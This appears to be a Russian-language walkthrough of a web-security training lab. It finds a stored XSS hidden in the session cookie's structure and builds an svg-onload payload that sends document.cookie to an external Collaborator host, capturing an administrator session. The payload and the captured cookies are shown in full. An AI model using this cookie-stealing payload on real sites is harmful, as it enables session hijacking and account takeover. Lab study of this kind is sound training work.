Эта лаборатория содержит уязвимость, которую трудно найти вручную. Она находится в нестандартной структуре данных.

Чтобы решить лабораторную работу, используйте функцию **сканирования выбранной точки вставки** сканера Burp , чтобы определить уязвимость, а затем вручную воспользуйтесь ею и удалите `carlos`.

Вы можете войти в свою учетную запись, используя следующие учетные данные:`wiener:peter`

## Дано

учётка тестовая `wiener:peter`

уязвимость, которую трудно найти вручную, она находится в нестандартной структуре данных.

## Задача

определить уязвимость, а затем вручную воспользуйтесь ею и удалить `carlos`.


# Решение 

Пробежимся по функционалу входа в учётку
- проводим актив скан POST /login (сканнер ничего не нашёл) личная проверка ничего не нашла странного 
- проводим актив скан GET /my-account?id=wiener (сканнер ничего не нашёл) при личном осмотре в `Cookie: session=wiener%3akG1Cl0ud8nccOJzmlmge7FAKNOd7oMpD` сессия имеет символ разделения двоеточия так как я уже с таким сталкивался то проведу проверку на значения после `%3a` 

В самом начале сканирования сессионных кук видим уязвимость СSRF межсайтинговый скриптинг
![[Pasted image 20250210131520.png]]
```
Payload `'"><svg/onload=fetch\`//vony0z9mobt8h9rqxe61gyxgf7l09uxmnae01qpf.oastify.com`>` был отправлен в точку ручного ввода 1. Этот payload предназначен для того, чтобы заставить веб-браузер, который его отображает, выполнить запрос к внешнему домену. HTTP-запрос был отправлен на этот домен, что указывает на то, что payload был отображён и выполнен в веб-браузере. Взаимодействие произошло примерно через 39 секунд после завершения сканирования элемента.

Входящий HTTP-запрос на сервер Collaborator содержал следующий URL в заголовке `Referer`, что может указывать на место, где payload был отображён в веб-браузере:
```

Формируем полезную нагрузку с пэйлоада от сканирования
```
'"><svg/onload=fetch`//kvjths8t07qjoucyqrsk7iyeb5hw5sth\.oastify.com`>:kG1Cl0ud8nccOJzmlmge7FAKNOd7oMpD
```
Добавляем  `${encodeURIComponent(document.cookie)}`

Формула
```
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
```

Итоговая нагрузка
```
'"><svg/onload=fetch(`//kvjths8t07qjoucyqrsk7iyeb5hw5sth\.oastify.com/${encodeURIComponent(document.cookie)}`)>:kG1Cl0ud8nccOJzmlmge7FAKNOd7oMpD
```

Получили
![[Pasted image 20250210132821.png]]
```
GET /session%3Dadministrator%253aKZBJQgaajvF1y2ORdWN36TrUSS7mtaIh%3B%20secret%3DIciRmU8KUP8kvTo4IW673MEcPIdf016O%3B%20session%3Dadministrator%253aKZBJQgaajvF1y2ORdWN36TrUSS7mtaIh HTTP/1.1
```

```
session=administrator:KZBJQgaajvF1y2ORdWN36TrUSS7mtaIh; secret=IciRmU8KUP8kvTo4IW673MEcPIdf016O; session=administrator:KZBJQgaajvF1y2ORdWN36TrUSS7mtaIh
```


